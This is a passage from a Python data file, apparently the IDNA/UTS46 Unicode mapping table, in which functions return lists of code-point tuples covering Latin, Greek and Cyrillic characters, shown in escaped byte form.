\'\xc3\xb5\'),\n    (0xD6, \'M\', \'\xc3\xb6\'),\n    (0xD7, \'V\'),\n    (0xD8, \'M\', \'\xc3\xb8\'),\n    (0xD9, \'M\', \'\xc3\xb9\'),\n    (0xDA, \'M\', \'\xc3\xba\'),\n    (0xDB, \'M\', \'\xc3\xbb\'),\n    (0xDC, \'M\', \'\xc3\xbc\'),\n    (0xDD, \'M\', \'\xc3\xbd\'),\n    (0xDE, \'M\', \'\xc3\xbe\'),\n    (0xDF, \'D\', \'ss\'),\n    (0xE0, \'V\'),\n    (0xE1, \'V\'),\n    (0xE2, \'V\'),\n    (0xE3, \'V\'),\n    (0xE4, \'V\'),\n    (0xE5, \'V\'),\n    (0xE6, \'V\'),\n    (0xE7, \'V\'),\n    (0xE8, \'V\'),\n    (0xE9, \'V\'),\n    (0xEA, \'V\'),\n    (0xEB, \'V\'),\n    (0xEC, \'V\'),\n    (0xED, \'V\'),\n    (0xEE, \'V\'),\n    (0xEF, \'V\'),\n    (0xF0, \'V\'),\n    (0xF1, \'V\'),\n    (0xF2, \'V\'),\n    (0xF3, \'V\'),\n    (0xF4, \'V\'),\n    (0xF5, \'V\'),\n    (0xF6, \'V\'),\n    (0xF7, \'V\'),\n    (0xF8, \'V\'),\n    (0xF9, \'V\'),\n    (0xFA, \'V\'),\n    (0xFB, \'V\'),\n    (0xFC, \'V\'),\n    (0xFD, \'V\'),\n    (0xFE, \'V\'),\n    (0xFF, \'V\'),\n    (0x100, \'M\', \'\xc4\x81\'),\n    (0x101, \'V\'),\n    (0x102, \'M\', \'\xc4\x83\'),\n    (0x103, \'V\'),\n    (0x104, \'M\', \'\xc4\x85\'),\n    (0x105, \'V\'),\n    (0x106, \'M\', \'\xc4\x87\'),\n    (0x107, \'V\'),\n    (0x108, \'M\', \'\xc4\x89\'),\n    (0x109, \'V\'),\n    (0x10A, \'M\', \'\xc4\x8b\'),\n    (0x10B, \'V\'),\n    (0x10C, \'M\', \'\xc4\x8d\'),\n    (0x10D, \'V\'),\n    (0x10E, \'M\', \'\xc4\x8f\'),\n    (0x10F, \'V\'),\n    (0x110, \'M\', \'\xc4\x91\'),\n    (0x111, \'V\'),\n    (0x112, \'M\', \'\xc4\x93\'),\n    (0x113, \'V\'),\n    (0x114, \'M\', \'\xc4\x95\'),\n    (0x115, \'V\'),\n    (0x116, \'M\', \'\xc4\x97\'),\n    (0x117, \'V\'),\n    (0x118, \'M\', \'\xc4\x99\'),\n    (0x119, \'V\'),\n    (0x11A, \'M\', \'\xc4\x9b\'),\n    (0x11B, \'V\'),\n    (0x11C, \'M\', \'\xc4\x9d\'),\n    (0x11D, \'V\'),\n    (0x11E, \'M\', \'\xc4\x9f\'),\n    (0x11F, \'V\'),\n    (0x120, \'M\', \'\xc4\xa1\'),\n    (0x121, \'V\'),\n    (0x122, \'M\', \'\xc4\xa3\'),\n    (0x123, \'V\'),\n    (0x124, \'M\', \'\xc4\xa5\'),\n    (0x125, \'V\'),\n    (0x126, \'M\', \'\xc4\xa7\'),\n    (0x127, \'V\'),\n    (0x128, \'M\', \'\xc4\xa9\'),\n    (0x129, \'V\'),\n    (0x12A, \'M\', \'\xc4\xab\'),\n    (0x12B, \'V\'),\n    ]\n\ndef _seg_3() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x12C, \'M\', \'\xc4\xad\'),\n    (0x12D, \'V\'),\n    (0x12E, \'M\', \'\xc4\xaf\'),\n    (0x12F, \'V\'),\n    (0x130, \'M\', \'i\xcc\x87\'),\n    (0x131, \'V\'),\n    (0x132, \'M\', \'ij\'),\n    (0x134, \'M\', \'\xc4\xb5\'),\n    (0x135, \'V\'),\n    (0x136, \'M\', \'\xc4\xb7\'),\n    (0x137, \'V\'),\n    (0x139, \'M\', \'\xc4\xba\'),\n    (0x13A, \'V\'),\n    (0x13B, \'M\', \'\xc4\xbc\'),\n    (0x13C, \'V\'),\n    (0x13D, \'M\', \'\xc4\xbe\'),\n    (0x13E, \'V\'),\n    (0x13F, \'M\', \'l\xc2\xb7\'),\n    (0x141, \'M\', \'\xc5\x82\'),\n    (0x142, \'V\'),\n    (0x143, \'M\', \'\xc5\x84\'),\n    (0x144, \'V\'),\n    (0x145, \'M\', \'\xc5\x86\'),\n    (0x146, \'V\'),\n    (0x147, \'M\', \'\xc5\x88\'),\n    (0x148, \'V\'),\n    (0x149, \'M\', \'\xca\xbcn\'),\n    (0x14A, \'M\', \'\xc5\x8b\'),\n    (0x14B, \'V\'),\n    (0x14C, \'M\', \'\xc5\x8d\'),\n    (0x14D, \'V\'),\n    (0x14E, \'M\', \'\xc5\x8f\'),\n    (0x14F, \'V\'),\n    (0x150, \'M\', \'\xc5\x91\'),\n    (0x151, \'V\'),\n    (0x152, \'M\', \'\xc5\x93\'),\n    (0x153, \'V\'),\n    (0x154, \'M\', \'\xc5\x95\'),\n    (0x155, \'V\'),\n    (0x156, \'M\', \'\xc5\x97\'),\n    (0x157, \'V\'),\n    (0x158, \'M\', \'\xc5\x99\'),\n    (0x159, \'V\'),\n    (0x15A, \'M\', \'\xc5\x9b\'),\n    (0x15B, \'V\'),\n    (0x15C, \'M\', \'\xc5\x9d\'),\n    (0x15D, \'V\'),\n    (0x15E, \'M\', \'\xc5\x9f\'),\n    (0x15F, \'V\'),\n    (0x160, \'M\', \'\xc5\xa1\'),\n    (0x161, \'V\'),\n    (0x162, \'M\', \'\xc5\xa3\'),\n    (0x163, \'V\'),\n    (0x164, \'M\', \'\xc5\xa5\'),\n    (0x165, \'V\'),\n    (0x166, \'M\', \'\xc5\xa7\'),\n    (0x167, \'V\'),\n    (0x168, \'M\', \'\xc5\xa9\'),\n    (0x169, \'V\'),\n    (0x16A, \'M\', \'\xc5\xab\'),\n    (0x16B, \'V\'),\n    (0x16C, \'M\', \'\xc5\xad\'),\n    (0x16D, \'V\'),\n    (0x16E, \'M\', \'\xc5\xaf\'),\n    (0x16F, \'V\'),\n    (0x170, \'M\', \'\xc5\xb1\'),\n    (0x171, \'V\'),\n    (0x172, \'M\', \'\xc5\xb3\'),\n    (0x173, \'V\'),\n    (0x174, \'M\', \'\xc5\xb5\'),\n    (0x175, \'V\'),\n    (0x176, \'M\', \'\xc5\xb7\'),\n    (0x177, \'V\'),\n    (0x178, \'M\', \'\xc3\xbf\'),\n    (0x179, \'M\', \'\xc5\xba\'),\n    (0x17A, \'V\'),\n    (0x17B, \'M\', \'\xc5\xbc\'),\n    (0x17C, \'V\'),\n    (0x17D, \'M\', \'\xc5\xbe\'),\n    (0x17E, \'V\'),\n    (0x17F, \'M\', \'s\'),\n    (0x180, \'V\'),\n    (0x181, \'M\', \'\xc9\x93\'),\n    (0x182, \'M\', \'\xc6\x83\'),\n    (0x183, \'V\'),\n    (0x184, \'M\', \'\xc6\x85\'),\n    (0x185, \'V\'),\n    (0x186, \'M\', \'\xc9\x94\'),\n    (0x187, \'M\', \'\xc6\x88\'),\n    (0x188, \'V\'),\n    (0x189, \'M\', \'\xc9\x96\'),\n    (0x18A, \'M\', \'\xc9\x97\'),\n    (0x18B, \'M\', \'\xc6\x8c\'),\n    (0x18C, \'V\'),\n    (0x18E, \'M\', \'\xc7\x9d\'),\n    (0x18F, \'M\', \'\xc9\x99\'),\n    (0x190, \'M\', \'\xc9\x9b\'),\n    (0x191, \'M\', \'\xc6\x92\'),\n    (0x192, \'V\'),\n    (0x193, \'M\', \'\xc9\xa0\'),\n    ]\n\ndef _seg_4() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x194, \'M\', \'\xc9\xa3\'),\n    (0x195, \'V\'),\n    (0x196, \'M\', \'\xc9\xa9\'),\n    (0x197, \'M\', \'\xc9\xa8\'),\n    (0x198, \'M\', \'\xc6\x99\'),\n    (0x199, \'V\'),\n    (0x19C, \'M\', \'\xc9\xaf\'),\n    (0x19D, \'M\', \'\xc9\xb2\'),\n    (0x19E, \'V\'),\n    (0x19F, \'M\', \'\xc9\xb5\'),\n    (0x1A0, \'M\', \'\xc6\xa1\'),\n    (0x1A1, \'V\'),\n    (0x1A2, \'M\', \'\xc6\xa3\'),\n    (0x1A3, \'V\'),\n    (0x1A4, \'M\', \'\xc6\xa5\'),\n    (0x1A5, \'V\'),\n    (0x1A6, \'M\', \'\xca\x80\'),\n    (0x1A7, \'M\', \'\xc6\xa8\'),\n    (0x1A8, \'V\'),\n    (0x1A9, \'M\', \'\xca\x83\'),\n    (0x1AA, \'V\'),\n    (0x1AC, \'M\', \'\xc6\xad\'),\n    (0x1AD, \'V\'),\n    (0x1AE, \'M\', \'\xca\x88\'),\n    (0x1AF, \'M\', \'\xc6\xb0\'),\n    (0x1B0, \'V\'),\n    (0x1B1, \'M\', \'\xca\x8a\'),\n    (0x1B2, \'M\', \'\xca\x8b\'),\n    (0x1B3, \'M\', \'\xc6\xb4\'),\n    (0x1B4, \'V\'),\n    (0x1B5, \'M\', \'\xc6\xb6\'),\n    (0x1B6, \'V\'),\n    (0x1B7, \'M\', \'\xca\x92\'),\n    (0x1B8, \'M\', \'\xc6\xb9\'),\n    (0x1B9, \'V\'),\n    (0x1BC, \'M\', \'\xc6\xbd\'),\n    (0x1BD, \'V\'),\n    (0x1C4, \'M\', \'d\xc5\xbe\'),\n    (0x1C7, \'M\', \'lj\'),\n    (0x1CA, \'M\', \'nj\'),\n    (0x1CD, \'M\', \'\xc7\x8e\'),\n    (0x1CE, \'V\'),\n    (0x1CF, \'M\', \'\xc7\x90\'),\n    (0x1D0, \'V\'),\n    (0x1D1, \'M\', \'\xc7\x92\'),\n    (0x1D2, \'V\'),\n    (0x1D3, \'M\', \'\xc7\x94\'),\n    (0x1D4, \'V\'),\n    (0x1D5, \'M\', \'\xc7\x96\'),\n    (0x1D6, \'V\'),\n    (0x1D7, \'M\', \'\xc7\x98\'),\n    (0x1D8, \'V\'),\n    (0x1D9, \'M\', \'\xc7\x9a\'),\n    (0x1DA, \'V\'),\n    (0x1DB, \'M\', \'\xc7\x9c\'),\n    (0x1DC, \'V\'),\n    (0x1DE, \'M\', \'\xc7\x9f\'),\n    (0x1DF, \'V\'),\n    (0x1E0, \'M\', \'\xc7\xa1\'),\n    (0x1E1, \'V\'),\n    (0x1E2, \'M\', \'\xc7\xa3\'),\n    (0x1E3, \'V\'),\n    (0x1E4, \'M\', \'\xc7\xa5\'),\n    (0x1E5, \'V\'),\n    (0x1E6, \'M\', \'\xc7\xa7\'),\n    (0x1E7, \'V\'),\n    (0x1E8, \'M\', \'\xc7\xa9\'),\n    (0x1E9, \'V\'),\n    (0x1EA, \'M\', \'\xc7\xab\'),\n    (0x1EB, \'V\'),\n    (0x1EC, \'M\', \'\xc7\xad\'),\n    (0x1ED, \'V\'),\n    (0x1EE, \'M\', \'\xc7\xaf\'),\n    (0x1EF, \'V\'),\n    (0x1F1, \'M\', \'dz\'),\n    (0x1F4, \'M\', \'\xc7\xb5\'),\n    (0x1F5, \'V\'),\n    (0x1F6, \'M\', \'\xc6\x95\'),\n    (0x1F7, \'M\', \'\xc6\xbf\'),\n    (0x1F8, \'M\', \'\xc7\xb9\'),\n    (0x1F9, \'V\'),\n    (0x1FA, \'M\', \'\xc7\xbb\'),\n    (0x1FB, \'V\'),\n    (0x1FC, \'M\', \'\xc7\xbd\'),\n    (0x1FD, \'V\'),\n    (0x1FE, \'M\', \'\xc7\xbf\'),\n    (0x1FF, \'V\'),\n    (0x200, \'M\', \'\xc8\x81\'),\n    (0x201, \'V\'),\n    (0x202, \'M\', \'\xc8\x83\'),\n    (0x203, \'V\'),\n    (0x204, \'M\', \'\xc8\x85\'),\n    (0x205, \'V\'),\n    (0x206, \'M\', \'\xc8\x87\'),\n    (0x207, \'V\'),\n    (0x208, \'M\', \'\xc8\x89\'),\n    (0x209, \'V\'),\n    (0x20A, \'M\', \'\xc8\x8b\'),\n    (0x20B, \'V\'),\n    (0x20C, \'M\', \'\xc8\x8d\'),\n    ]\n\ndef _seg_5() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x20D, \'V\'),\n    (0x20E, \'M\', \'\xc8\x8f\'),\n    (0x20F, \'V\'),\n    (0x210, \'M\', \'\xc8\x91\'),\n    (0x211, \'V\'),\n    (0x212, \'M\', \'\xc8\x93\'),\n    (0x213, \'V\'),\n    (0x214, \'M\', \'\xc8\x95\'),\n    (0x215, \'V\'),\n    (0x216, \'M\', \'\xc8\x97\'),\n    (0x217, \'V\'),\n    (0x218, \'M\', \'\xc8\x99\'),\n    (0x219, \'V\'),\n    (0x21A, \'M\', \'\xc8\x9b\'),\n    (0x21B, \'V\'),\n    (0x21C, \'M\', \'\xc8\x9d\'),\n    (0x21D, \'V\'),\n    (0x21E, \'M\', \'\xc8\x9f\'),\n    (0x21F, \'V\'),\n    (0x220, \'M\', \'\xc6\x9e\'),\n    (0x221, \'V\'),\n    (0x222, \'M\', \'\xc8\xa3\'),\n    (0x223, \'V\'),\n    (0x224, \'M\', \'\xc8\xa5\'),\n    (0x225, \'V\'),\n    (0x226, \'M\', \'\xc8\xa7\'),\n    (0x227, \'V\'),\n    (0x228, \'M\', \'\xc8\xa9\'),\n    (0x229, \'V\'),\n    (0x22A, \'M\', \'\xc8\xab\'),\n    (0x22B, \'V\'),\n    (0x22C, \'M\', \'\xc8\xad\'),\n    (0x22D, \'V\'),\n    (0x22E, \'M\', \'\xc8\xaf\'),\n    (0x22F, \'V\'),\n    (0x230, \'M\', \'\xc8\xb1\'),\n    (0x231, \'V\'),\n    (0x232, \'M\', \'\xc8\xb3\'),\n    (0x233, \'V\'),\n    (0x23A, \'M\', \'\xe2\xb1\xa5\'),\n    (0x23B, \'M\', \'\xc8\xbc\'),\n    (0x23C, \'V\'),\n    (0x23D, \'M\', \'\xc6\x9a\'),\n    (0x23E, \'M\', \'\xe2\xb1\xa6\'),\n    (0x23F, \'V\'),\n    (0x241, \'M\', \'\xc9\x82\'),\n    (0x242, \'V\'),\n    (0x243, \'M\', \'\xc6\x80\'),\n    (0x244, \'M\', \'\xca\x89\'),\n    (0x245, \'M\', \'\xca\x8c\'),\n    (0x246, \'M\', \'\xc9\x87\'),\n    (0x247, \'V\'),\n    (0x248, \'M\', \'\xc9\x89\'),\n    (0x249, \'V\'),\n    (0x24A, \'M\', \'\xc9\x8b\'),\n    (0x24B, \'V\'),\n    (0x24C, \'M\', \'\xc9\x8d\'),\n    (0x24D, \'V\'),\n    (0x24E, \'M\', \'\xc9\x8f\'),\n    (0x24F, \'V\'),\n    (0x2B0, \'M\', \'h\'),\n    (0x2B1, \'M\', \'\xc9\xa6\'),\n    (0x2B2, \'M\', \'j\'),\n    (0x2B3, \'M\', \'r\'),\n    (0x2B4, \'M\', \'\xc9\xb9\'),\n    (0x2B5, \'M\', \'\xc9\xbb\'),\n    (0x2B6, \'M\', \'\xca\x81\'),\n    (0x2B7, \'M\', \'w\'),\n    (0x2B8, \'M\', \'y\'),\n    (0x2B9, \'V\'),\n    (0x2D8, \'3\', \' \xcc\x86\'),\n    (0x2D9, \'3\', \' \xcc\x87\'),\n    (0x2DA, \'3\', \' \xcc\x8a\'),\n    (0x2DB, \'3\', \' \xcc\xa8\'),\n    (0x2DC, \'3\', \' \xcc\x83\'),\n    (0x2DD, \'3\', \' \xcc\x8b\'),\n    (0x2DE, \'V\'),\n    (0x2E0, \'M\', \'\xc9\xa3\'),\n    (0x2E1, \'M\', \'l\'),\n    (0x2E2, \'M\', \'s\'),\n    (0x2E3, \'M\', \'x\'),\n    (0x2E4, \'M\', \'\xca\x95\'),\n    (0x2E5, \'V\'),\n    (0x340, \'M\', \'\xcc\x80\'),\n    (0x341, \'M\', \'\xcc\x81\'),\n    (0x342, \'V\'),\n    (0x343, \'M\', \'\xcc\x93\'),\n    (0x344, \'M\', \'\xcc\x88\xcc\x81\'),\n    (0x345, \'M\', \'\xce\xb9\'),\n    (0x346, \'V\'),\n    (0x34F, \'I\'),\n    (0x350, \'V\'),\n    (0x370, \'M\', \'\xcd\xb1\'),\n    (0x371, \'V\'),\n    (0x372, \'M\', \'\xcd\xb3\'),\n    (0x373, \'V\'),\n    (0x374, \'M\', \'\xca\xb9\'),\n    (0x375, \'V\'),\n    (0x376, \'M\', \'\xcd\xb7\'),\n    (0x377, \'V\'),\n    ]\n\ndef _seg_6() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x378, \'X\'),\n    (0x37A, \'3\', \' \xce\xb9\'),\n    (0x37B, \'V\'),\n    (0x37E, \'3\', \';\'),\n    (0x37F, \'M\', \'\xcf\xb3\'),\n    (0x380, \'X\'),\n    (0x384, \'3\', \' \xcc\x81\'),\n    (0x385, \'3\', \' \xcc\x88\xcc\x81\'),\n    (0x386, \'M\', \'\xce\xac\'),\n    (0x387, \'M\', \'\xc2\xb7\'),\n    (0x388, \'M\', \'\xce\xad\'),\n    (0x389, \'M\', \'\xce\xae\'),\n    (0x38A, \'M\', \'\xce\xaf\'),\n    (0x38B, \'X\'),\n    (0x38C, \'M\', \'\xcf\x8c\'),\n    (0x38D, \'X\'),\n    (0x38E, \'M\', \'\xcf\x8d\'),\n    (0x38F, \'M\', \'\xcf\x8e\'),\n    (0x390, \'V\'),\n    (0x391, \'M\', \'\xce\xb1\'),\n    (0x392, \'M\', \'\xce\xb2\'),\n    (0x393, \'M\', \'\xce\xb3\'),\n    (0x394, \'M\', \'\xce\xb4\'),\n    (0x395, \'M\', \'\xce\xb5\'),\n    (0x396, \'M\', \'\xce\xb6\'),\n    (0x397, \'M\', \'\xce\xb7\'),\n    (0x398, \'M\', \'\xce\xb8\'),\n    (0x399, \'M\', \'\xce\xb9\'),\n    (0x39A, \'M\', \'\xce\xba\'),\n    (0x39B, \'M\', \'\xce\xbb\'),\n    (0x39C, \'M\', \'\xce\xbc\'),\n    (0x39D, \'M\', \'\xce\xbd\'),\n    (0x39E, \'M\', \'\xce\xbe\'),\n    (0x39F, \'M\', \'\xce\xbf\'),\n    (0x3A0, \'M\', \'\xcf\x80\'),\n    (0x3A1, \'M\', \'\xcf\x81\'),\n    (0x3A2, \'X\'),\n    (0x3A3, \'M\', \'\xcf\x83\'),\n    (0x3A4, \'M\', \'\xcf\x84\'),\n    (0x3A5, \'M\', \'\xcf\x85\'),\n    (0x3A6, \'M\', \'\xcf\x86\'),\n    (0x3A7, \'M\', \'\xcf\x87\'),\n    (0x3A8, \'M\', \'\xcf\x88\'),\n    (0x3A9, \'M\', \'\xcf\x89\'),\n    (0x3AA, \'M\', \'\xcf\x8a\'),\n    (0x3AB, \'M\', \'\xcf\x8b\'),\n    (0x3AC, \'V\'),\n    (0x3C2, \'D\', \'\xcf\x83\'),\n    (0x3C3, \'V\'),\n    (0x3CF, \'M\', \'\xcf\x97\'),\n    (0x3D0, \'M\', \'\xce\xb2\'),\n    (0x3D1, \'M\', \'\xce\xb8\'),\n    (0x3D2, \'M\', \'\xcf\x85\'),\n    (0x3D3, \'M\', \'\xcf\x8d\'),\n    (0x3D4, \'M\', \'\xcf\x8b\'),\n    (0x3D5, \'M\', \'\xcf\x86\'),\n    (0x3D6, \'M\', \'\xcf\x80\'),\n    (0x3D7, \'V\'),\n    (0x3D8, \'M\', \'\xcf\x99\'),\n    (0x3D9, \'V\'),\n    (0x3DA, \'M\', \'\xcf\x9b\'),\n    (0x3DB, \'V\'),\n    (0x3DC, \'M\', \'\xcf\x9d\'),\n    (0x3DD, \'V\'),\n    (0x3DE, \'M\', \'\xcf\x9f\'),\n    (0x3DF, \'V\'),\n    (0x3E0, \'M\', \'\xcf\xa1\'),\n    (0x3E1, \'V\'),\n    (0x3E2, \'M\', \'\xcf\xa3\'),\n    (0x3E3, \'V\'),\n    (0x3E4, \'M\', \'\xcf\xa5\'),\n    (0x3E5, \'V\'),\n    (0x3E6, \'M\', \'\xcf\xa7\'),\n    (0x3E7, \'V\'),\n    (0x3E8, \'M\', \'\xcf\xa9\'),\n    (0x3E9, \'V\'),\n    (0x3EA, \'M\', \'\xcf\xab\'),\n    (0x3EB, \'V\'),\n    (0x3EC, \'M\', \'\xcf\xad\'),\n    (0x3ED, \'V\'),\n    (0x3EE, \'M\', \'\xcf\xaf\'),\n    (0x3EF, \'V\'),\n    (0x3F0, \'M\', \'\xce\xba\'),\n    (0x3F1, \'M\', \'\xcf\x81\'),\n    (0x3F2, \'M\', \'\xcf\x83\'),\n    (0x3F3, \'V\'),\n    (0x3F4, \'M\', \'\xce\xb8\'),\n    (0x3F5, \'M\', \'\xce\xb5\'),\n    (0x3F6, \'V\'),\n    (0x3F7, \'M\', \'\xcf\xb8\'),\n    (0x3F8, \'V\'),\n    (0x3F9, \'M\', \'\xcf\x83\'),\n    (0x3FA, \'M\', \'\xcf\xbb\'),\n    (0x3FB, \'V\'),\n    (0x3FD, \'M\', \'\xcd\xbb\'),\n    (0x3FE, \'M\', \'\xcd\xbc\'),\n    (0x3FF, \'M\', \'\xcd\xbd\'),\n    (0x400, \'M\', \'\xd1\x90\'),\n    (0x401, \'M\', \'\xd1\x91\'),\n    (0x402, \'M\', \'\xd1\x92\'),\n    ]\n\ndef _seg_7() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x403, \'M\', \'\xd1\x93\'),\n    (0x404, \'M\', \'\xd1\x94\'),\n    (0x405, \'M\', \'\xd1\x95\'),\n    (0x406, \'M\', \'\xd1\x96\'),\n    (0x407, \'M\', \'\xd1\x97\'),\n    (0x408, \'M\', \'\xd1\x98\'),\n    (0x409, \'M\', \'\xd1\x99\'),\n    (0x40A, \'M\', \'\xd1\x9a\'),\n    (0x40B, \'M\', \'\xd1\x9b\'),\n    (0x40C, \'M\', \'\xd1\x9c\'),\n    (0x40D, \'M\', \'\xd1\x9d\'),\n    (0x40E, \'M\', \'\xd1\x9e\'),\n    (0x40F, \'M\', \'\xd1\x9f\'),\n    (0x410, \'M\', \'\xd0\xb0\'),\n    (0x411, \'M\', \'\xd0\xb1\'),\n    (0x412, \'M\', \'\xd0\xb2\'),\n    (0x413, \'M\', \'\xd0\xb3\'),\n    (0x414, \'M\', \'\xd0\xb4\'),\n    (0x415, \'M\', \'\xd0\xb5\'),\n    (0x416, \'M\', \'\xd0\xb6\'),\n    (0x417, \'M\', \'\xd0\xb7\'),\n    (0x418, \'M\', \'\xd0\xb8\'),\n    (0x419, \'M\', \'\xd0\xb9\'),\n    (0x41A, \'M\', \'\xd0\xba\'),\n    (0x41B, \'M\', \'\xd0\xbb\'),\n    (0x41C, \'M\', \'\xd0\xbc\'),\n    (0x41D, \'M\', \'\xd0\xbd\'),\n    (0x41E, \'M\', \'\xd0\xbe\'),\n    (0x41F, \'M\', \'\xd0\xbf\'),\n    (0x420, \'M\', \'\xd1\x80\'),\n    (0x421, \'M\', \'\xd1\x81\'),\n    (0x422, \'M\', \'\xd1\x82\'),\n    (0x423, \'M\', \'\xd1\x83\'),\n    (0x424, \'M\', \'\xd1\x84\'),\n    (0x425, \'M\', \'\xd1\x85\'),\n    (0x426, \'M\', \'\xd1\x86\'),\n    (0x427, \'M\', \'\xd1\x87\'),\n    (0x428, \'M\', \'\xd1\x88\'),\n    (0x429, \'M\', \'\xd1\x89\'),\n    (0x42A, \'M\', \'\xd1\x8a\'),\n    (0x42B, \'M\', \'\xd1\x8b\'),\n    (0x42C, \'M\', \'\xd1\x8c\'),\n    (0x42D, \'M\', \'\xd1\x8d\'),\n    (0x42E, \'M\', \'\xd1\x8e\'),\n    (0x42F, \'M\', \'\xd1\x8f\'),\n    (0x430, \'V\'),\n    (0x460, \'M\', \'\xd1\xa1\'),\n    (0x461, \'V\'),\n    (0x462, \'M\', \'\xd1\xa3\'),\n    (0x463, \'V\'),\n    (0x464, \'M\', \'\xd1\xa5\'),\n    (0x465, \'V\'),\n    (0x466, \'M\', \'\xd1\xa7\'),\n    (0x467, \'V\'),\n    (0x468, \'M\', \'\xd1\xa9\'),\n    (0x469, \'V\'),\n    (0x46A, \'M\', \'\xd1\xab\'),\n    (0x46B, \'V\'),\n    (0x46C, \'M\', \'\xd1\xad\'),\n    (0x46D, \'V\'),\n    (0x46E, \'M\', \'\xd1\xaf\'),\n    (0x46F, \'V\'),\n    (0x470, \'M\', \'\xd1\xb1\'),\n    (0x471, \'V\'),\n    (0x472, \'M\', \'\xd1\xb3\'),\n    (0x473, \'V\'),\n    (0x474, \'M\', \'\xd1\xb5\'),\n    (0x475, \'V\'),\n    (0x476, \'M\', \'\xd1\xb7\'),\n    (0x477, \'V\'),\n    (0x478, \'M\', \'\xd1\xb9\'),\n    (0x479, \'V\'),\n    (0x47A, \'M\', \'\xd1\xbb\'),\n    (0x47B, \'V\'),\n    (0x47C, \'M\', \'\xd1\xbd\'),\n    (0x47D, \'V\'),\n    (0x47E, \'M\', \'\xd1\xbf\'),\n    (0x47F, \'V\'),\n    (0x480, \'M\', \'\xd2\x81\'),\n    (0x481, \'V\'),\n    (0x48A, \'M\', \'\xd2\x8b\'),\n    (0x48B, \'V\'),\n    (0x48C, \'M\', \'\xd2\x8d\'),\n    (0x48D, \'V\'),\n    (0x48E, \'M\', \'\xd2\x8f\'),\n    (0x48F, \'V\'),\n    (0x490, \'M\', \'\xd2\x91\'),\n    (0x491, \'V\'),\n    (0x492, \'M\', \'\xd2\x93\'),\n    (0x493, \'V\'),\n    (0x494, \'M\', \'\xd2\x95\'),\n    (0x495, \'V\'),\n    (0x496, \'M\', \'\xd2\x97\'),\n    (0x497, \'V\'),\n    (0x498, \'M\', \'\xd2\x99\'),\n    (0x499, \'V\'),\n    (0x49A, \'M\', \'\xd2\x9b\'),\n    (0x49B, \'V\'),\n    (0x49C, \'M\', \'\xd2\x9d\'),\n    (0x49D, \'V\'),\n    ]\n\ndef _seg_8() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x49E, \'M\', \'\xd2\x9f\'),\n    (0x49F, \'V\'),\n    (0x4A0, \'M\', \'\xd2\xa1\'),\n    (0x4A1, \'V\'),\n    (0x4A2, \'M\', \'\xd2\xa3\'),\n    (0x4A3, \'V\'),\n    (0x4A4, \'M\', \'\xd2\xa5\'),\n    (0x4A5, \'V\'),\n    (0x4A6, \'M\', \'\xd2\xa7\'),\n    (0x4A7, \'V\'),\n    (0x4A8, \'M\', \'\xd2\xa9\'),\n    (0x4A9, \'V\'),\n    (0x4AA, \'M\', \'\xd2\xab\'),\n    (0x4AB, \'V\'),\n    (0x4AC, \'M\', \'\xd2\xad\'),\n    (0x4AD, \'V\'),\n    (0x4AE, \'M\', \'\xd2\xaf\'),\n    (0x4AF, \'V\'),\n    (0x4B0, \'M\', \'\xd2\xb1\'),\n    (0x4B1, \'V\'),\n    (0x4B2, \'M\', \'\xd2\xb3\'),\n    (0x4B3, \'V\'),\n    (0x4B4, \'M\', \'\xd2\xb5\'),\n    (0x4B5, \'V\'),\n    (0x4B6, \'M\', \'\xd2\xb7\'),\n    (0x4B7, \'V\'),\n    (0x4B8, \'M\', \'\xd2\xb9\'),\n    (0x4B9, \'V\'),\n    (0x4BA, \'M\', \'\xd2\xbb\'),\n    (0x4BB, \'V\'),\n    (0x4BC, \'M\', \'\xd2\xbd\'),\n    (0x4BD, \'V\'),\n    (0x4BE, \'M\', \'\xd2\xbf\'),\n    (0x4BF, \'V\'),\n    (0x4C0, \'X\'),\n    (0x4C1, \'M\', \'\xd3\x82\'),\n    (0x4C2, \'V\'),\n    (0x4C3, \'M\', \'\xd3\x84\'),\n    (0x4C4, \'V\'),\n    (0x4C5, \'M\', \'\xd3\x86\'),\n    (0x4C6, \'V\'),\n    (0x4C7, \'M\', \'\xd3\x88\'),\n    (0x4C8, \'V\'),\n    (0x4C9, \'M\', \'\xd3\x8a\'),\n    (0x4CA, \'V\'),\n    (0x4CB, \'M\', \'\xd3\x8c\'),\n    (0x4CC, \'V\'),\n    (0x4CD, \'M\', \'\xd3\x8e\'),\n    (0x4CE, \'V\'),\n    (0x4D0, \'M\', \'\xd3\x91\'),\n    (0x4D1, \'V\'),\n    (0x4D2, \'M\', \'\xd3\x93\'),\n    (0x4D3, \'V\'),\n    (0x4D4, \'M\', \'\xd3\x95\'),\n    (0x4D5, \'V\'),\n    (0x4D6, \'M\', \'\xd3\x97\'),\n    (0x4D7, \'V\'),\n    (0x4D8, \'M\', \'\xd3\x99\'),\n    (0x4D9, \'V\'),\n    (0x4DA, \'M\', \'\xd3\x9b\'),\n    (0x4DB, \'V\'),\n    (0x4DC, \'M\', \'\xd3\x9d\'),\n    (0x4DD, \'V\'),\n    (0x4DE, \'M\', \'\xd3\x9f\'),\n    (0x4DF, \'V\'),\n    (0x4E0, \'M\', \'\xd3\xa1\'),\n    (0x4E1, \'V\'),\n    (0x4E2, \'M\', \'\xd3\xa3\'),\n    (0x4E3, \'V\'),\n    (0x4E4, \'M\', \'\xd3\xa5\'),\n    (0x4E5, \'V\'),\n    (0x4E6, \'M\', \'\xd3\xa7\'),\n    (0x4E7, \'V\'),\n    (0x4E8, \'M\', \'\xd3\xa9\'),\n    (0x4E9, \'V\'),\n    (0x4EA, \'M\', \'\xd3\xab\'),\n    (0x4EB, \'V\'),\n    (0x4EC, \'M\', \'\xd3\xad\'),\n    (0x4ED, \'V\'),\n    (0x4EE, \'M\', \'\xd3\xaf\'),\n    (0x4EF, \'V\'),\n    (0x4F0, \'M\', \'\xd3\xb1\'),\n    (0x4F1, \'V\'),\n    (0x4F2, \'M\', \'\xd3\xb3\'),\n    (0x4F3, \'V\'),\n    (0x4F4, \'M\', \'\xd3\xb5\'),\n    (0x4F5, \'V\'),\n    (0x4F6, \'M\', \'\xd3\xb7\'),\n    (0x4F7, \'V\'),\n    (0x4F8, \'M\', \'\xd3\xb9\'),\n    (0x4F9, 